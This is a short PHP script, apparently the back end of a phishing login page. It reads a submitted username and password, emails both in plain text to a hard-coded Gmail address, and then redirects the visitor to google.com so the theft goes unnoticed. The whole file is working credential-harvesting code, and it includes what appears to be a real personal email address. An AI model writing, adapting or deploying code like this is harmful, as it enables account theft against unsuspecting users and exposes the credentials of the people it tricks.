<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = $_POST["usuario"];
    $contraseña = $_POST["contraseña"];

    // Configuración de correo electrónico
    $destinatario = "yosephnoe29@gmail.com";
    $asunto = "Inicio de sesión - Datos de usuario";
    $mensaje = "Usuario: $usuario\nContraseña: $contraseña";

    // Envío de correo electrónico
    if (mail($destinatario, $asunto, $mensaje)) {
        // Redireccionar al usuario a la página principal de Google después de enviar el correo electrónico
        header("Location: https://www.google.com");
        exit();
    } else {
        echo "Hubo un error al enviar el correo electrónico.";
    }
}
?>
